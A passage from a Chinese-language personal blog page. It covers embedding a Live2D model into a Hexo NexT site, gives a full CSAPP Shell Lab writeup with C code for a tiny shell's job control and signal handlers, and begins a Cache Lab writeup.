<li><code>live2dcubismcore.js</code>，是官方web sdk的</li>
</ul>
<p>相应所需要的js文件跟模型都一起放在了<a target="_blank" rel="noopener" href="https://github.com/Garen-Wang/live2d-moc3">我github的repo</a>里面，感谢开源，侵删。</p>
<p>可以首先在本地上试试能不能跑起来。事实上把这几行代码一起粘到<code>body</code>标签里面就好了：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;live2d&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span> <span class="attr">class</span>=<span class="string">&quot;live2d&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position: fixed; opacity: 1; left: -110px; bottom: -135px; z-index: 99999; pointer-events: none;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.1.1/js/live2dcubismcore.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.1.1/js/bundle.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">     <span class="keyword">var</span> resourcesPath = <span class="string">&#x27;https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@v0.1.0/&#x27;</span>; <span class="comment">// 指定资源文件（模型）保存的路径，使用github的release版本，路径如下https://cdn.jsdelivr.net/gh/用户/库@版本号/资源路径</span></span></span><br><span class="line"><span class="javascript">     <span class="keyword">var</span> backImageName = <span class="string">&#x27;&#x27;</span>; <span class="comment">// 指定背景图片 ,默认为空</span></span></span><br><span class="line"><span class="javascript">     <span class="keyword">var</span> modelDir = [<span class="string">&#x27;jiaran4&#x27;</span>]; <span class="comment">// 指定需要加载的模型</span></span></span><br><span class="line"><span class="javascript">     initDefine(resourcesPath, backImageName, modelDir); <span class="comment">// 初始化模型</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中不知道是cdn抽风还是什么奇怪的原因，原本应该是<code>v0.1.1</code>的地方需要是<code>vv0.1.1</code>才访问得到，非常奇怪。</p>
<p>如果正常的话应该是这样子：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/Hexo-Live2d-moc3-Configuration/demo.png">
<p>接下来把然然带进hexo博客里面。由于我用的NexT主题，修改<code>themes/next/layout/_layout.swig</code>，直接在<code>body</code>标签的最后边粘上去这几行，做法非常暴力。</p>
<p>不出意外的话然然应该就能跟爷同框了，像下面这样（</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/Hexo-Live2d-moc3-Configuration/result2.png">
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/07/20/CSAPP-Shell-Lab-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/20/CSAPP-Shell-Lab-Writeup/" class="post-title-link" itemprop="url">CSAPP Shell Lab Writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-07-20 17:09:19 / Modified: 20:40:17" itemprop="dateCreated datePublished" datetime="2021-07-20T17:09:19+08:00">2021-07-20</time>
            </span>

          
            <span id="/2021/07/20/CSAPP-Shell-Lab-Writeup/" class="post-meta-item leancloud_visitors" data-flag-title="CSAPP Shell Lab Writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/07/20/CSAPP-Shell-Lab-Writeup/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/07/20/CSAPP-Shell-Lab-Writeup/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h2><h3 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h3><p>Signal是一种内核与进程之间交互的信息。诸如熟悉的Ctrl+C、Ctrl+Z等终止程序或休眠程序的实质都是发送相应的signal。Signal是异常控制流的其中一种，可以在本地异步运行。</p>
<p>贴一些可能见得多的signal：</p>
<ul>
<li><code>SIGABRT</code>: abort</li>
<li><code>SIGFPE</code>: floating point exception</li>
<li><code>SIGINT</code>: interrupt (when pressing <code>Ctrl+C</code>)</li>
<li><code>SIGSEGV</code>: segment violation (a.k.a. segment fault)</li>
<li><code>SIGTSTP</code>: stopped (when pressing <code>Ctrl+Z</code>)</li>
<li><code>SIGCHLD</code>: Terminated or stopped child</li>
</ul>
<h3 id="Relative-C-Functions"><a href="#Relative-C-Functions" class="headerlink" title="Relative C Functions"></a>Relative C Functions</h3><p>在命令行里面，如果要给一个进程（或进程组）添加信号，可以用<code>kill</code>。<code>kill</code>并不只是用来杀进程的，实际上是添加信号。</p>
<p>在C里面也有一个叫<code>kill</code>的函数，需要指定pid和信号，用法大体类似。这就是我们可以用C写shell的原因之一。</p>
<blockquote>
<p><code>kill</code>可以作用于一个进程上，也可以作用于一整个进程组上，具体区别在pid的值：</p>
<ul>
<li>当pid为正，则作用于单个进程</li>
<li>当pid为负，则作用于这个进程所在的进程组</li>
</ul>
</blockquote>
<p>相信见过像Vim等的一些按Ctrl+C退不出的程序，之所以退不出不是因为<code>SIGINT</code>无法发出，而是因为signal的handler是可以由我们来自定义的。</p>
<p>在C里面，我们可以通过调用<code>signal</code>函数，install一个signal的handler，覆盖原有的默认handler。signal大多数都能覆盖，除了<code>SIGKILL</code>跟<code>SIGSTOP</code>等。</p>
<p>signal handler需要自己去声明定义一个函数，可以形象地理解成比较底层的try-catch，catch相应的signal，执行handler里面的内容。</p>
<p>如果想要写shell，相信需要在程序里面创建进程，执行命令等等。相应的C函数也介绍一下：</p>
<ul>
<li><code>int fork()</code>: create a new process (child process). called once, return twice. return 0 in child process, return pid in parent process.</li>
<li><code>int execve(argv[0], argv, environ)</code>: load and run another program. called once, never return(if sucessfully executed).</li>
<li><code>void exit(int status)</code>: terminate the current process with status. Then it becomes a zombie process, waiting to be reaped by its parent.</li>
</ul>
<p>如果我们fork了一次，父子两个进程的执行速度是无法确定的，有时儿子快有时儿子慢，这就导致了一次运行的结果可能不同。形象地，我们可以理解成在这种无约束的异步进程中，进程之间会相互比赛，竞争运行速度<del>（卷起来了）</del>，我们称这种现象为race。</p>
<p>如果不想出现这种情况，需要显式地叫其中一个进程去等其他的进程，这种操作可以用<code>waitpid</code>来完成。</p>
<p>signal可以被屏蔽，即可以选择block掉指定类型的signal，以确保race不会在其中发生。分析可能发生的race是最复杂的部分。</p>
<h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>在这个lab里面我们需要实现一个小型的shell，名叫tsh（tiny shell），因为不用实现现代shell的功能，所以功能确实很朴素。</p>
<p>实验需要我们写的只有<code>tsh.c</code>一个文件，需要你定义若干个已经声明的函数。</p>
<p>在<code>tsh.c</code>中也温馨地提供了几个helper functions。</p>
<p>用户运行了shell之后，会在<code>stdin</code>等待用户的输入。用户的输入以空格为分隔，第一个称为name，后面则为参数。</p>
<p>如果name是built-in command，则直接在前台运行，运行完直接等待下一个输入。</p>
<p>如果name是一个binary executable，则新开一个进程（或者说是add a new job），在子进程中执行命令。</p>
<p>命令有前台后台运行之分，如果最后带有一个<code>&amp;</code>，则为后台运行，此时shell不用去等待job运行完毕，可以继续执行shell的功能。前台等待job完成的内容需要在<code>waitfg</code>函数之中完成。</p>
<p>这里有一个细节，因为我们的shell是一个程序，而默认我们创建的job会跟shell是同一个进程组，那么如果子进程被杀掉的话shell也会被杀掉，这不符合shell的性质，所以我们需要保证创建的子进程都跟shell自己处于不同的进程组。这部分是通过<code>setpgid(0, 0)</code>来完成的。</p>
<p>在子进程执行完成之后，子进程会变成一个zombie，不再会被执行，但会一直占着地方，它们需要被shell回收。相关的信号是<code>SIGCHLD</code>。这部分的工作是通过定义<code>SIGCHLD</code>的handler来完成的。</p>
<p>pid跟jid的管理我们不用操心，已经写好了，我们只需要调用<code>addjob</code>跟<code>deletejob</code>这样的API来维护进程。</p>
<h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a><code>eval</code></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS];</span><br><span class="line">    <span class="keyword">int</span> bg = parseline(cmdline, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> builtin = builtin_cmd(argv);</span><br><span class="line">    <span class="keyword">if</span> (builtin) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* from now on, execute non-builtin command */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask, prev_mask, mask_all;</span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigaddset(&amp;mask, SIGCHLD);</span><br><span class="line">    </span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev_mask); <span class="comment">// block SIGCHLD</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork(); <span class="comment">// during fork, SIGCHLD is blocked</span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child process</span></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_mask, <span class="literal">NULL</span>); <span class="comment">// unblock SIGCHLD</span></span><br><span class="line">        setpgid(<span class="number">0</span>, <span class="number">0</span>); <span class="comment">// make sure programs are not in the same group as tsh</span></span><br><span class="line">        <span class="comment">// must unblock signals before execve</span></span><br><span class="line">        <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent process</span></span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>); <span class="comment">// block all signals</span></span><br><span class="line">        addjob(jobs, pid, bg + <span class="number">1</span>, cmdline); <span class="comment">// during addjob, all signals are blocked</span></span><br><span class="line">        <span class="keyword">if</span> (bg) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            waitfg(pid);</span><br><span class="line">        &#125;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_mask, <span class="literal">NULL</span>); <span class="comment">// reset</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a><code>builtin_cmd</code></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>)) &#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>)) &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;&amp;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a><code>do_bgfg</code></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> jid = atoi(argv[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">        job = getjobjid(jobs, jid);</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: No such job\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isdigit</span>(argv[<span class="number">1</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">        <span class="keyword">int</span> pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">        job = getjobpid(jobs, pid);</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%s): No such process\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    kill(-(job-&gt;pid), SIGCONT); <span class="comment">// send SIGCONT to the group, therefore negative</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a><code>waitfg</code></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// debug_printf(&quot;now in waitfg\n&quot;);</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgpid(jobs) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sigsuspend(&amp;mask);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="signal-handlers"><a href="#signal-handlers" class="headerlink" title="signal handlers"></a>signal handlers</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// debug_printf(&quot;in SIGCHLD handler&quot;);</span></span><br><span class="line">    <span class="keyword">int</span> prev_errno = errno;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">sigset_t</span> mask, prev;</span><br><span class="line">    sigfillset(&amp;mask);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">while</span> ((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status)) &#123;</span><br><span class="line">            <span class="comment">// normally exited</span></span><br><span class="line">            sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;</span><br><span class="line">            <span class="comment">// exited via signal</span></span><br><span class="line">            struct <span class="keyword">job_t</span> *job = getjobpid(jobs, pid);</span><br><span class="line">            sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) Terminated by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WTERMSIG(status));</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// stopped</span></span><br><span class="line">            struct <span class="keyword">job_t</span> *job = getjobpid(jobs, pid);</span><br><span class="line">            sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) Stopped by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, WSTOPSIG(status));</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    errno = prev_errno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// debug_printf(&quot;in SIGINT handler&quot;);</span></span><br><span class="line">    <span class="keyword">int</span> prev_errno = errno;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        kill(-pid, sig);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = prev_errno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// debug_printf(&quot;in SIGTSTP handler&quot;);</span></span><br><span class="line">    <span class="keyword">int</span> prev_errno = errno;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        kill(-pid, sig);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = prev_errno;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p>最后实现的就是可以一个可以跑绝对路径的shell，支持前后台运行以及信号级别的进程交互。</p>
<p>最后发现<code>tshref</code>也连vim都打不开，我就平衡了（</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/07/15/CSAPP-Cache-Lab-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/15/CSAPP-Cache-Lab-Writeup/" class="post-title-link" itemprop="url">CSAPP Cache Lab Writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-07-15 16:04:52 / Modified: 17:23:00" itemprop="dateCreated datePublished" datetime="2021-07-15T16:04:52+08:00">2021-07-15</time>
            </span>

          
            <span id="/2021/07/15/CSAPP-Cache-Lab-Writeup/" class="post-meta-item leancloud_visitors" data-flag-title="CSAPP Cache Lab Writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/07/15/CSAPP-Cache-Lab-Writeup/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/07/15/CSAPP-Cache-Lab-Writeup/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h2 id="Cache知识点概述"><a href="#Cache知识点概述" class="headerlink" title="Cache知识点概述"></a>Cache知识点概述</h2><p>一般来说，cache就是这样的结构：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Cache-Lab-Writeup/organization-of-cache.png">
<blockquote>
<p>来自CSAPP 3e Figure 6.25</p>
</blockquote>
<p>首先看(a)图，这么一个cache里面有着$S=2^s$个set，每个set里面又有$E$个line，而每一个line就是cache里面的基本组成单位。</p>
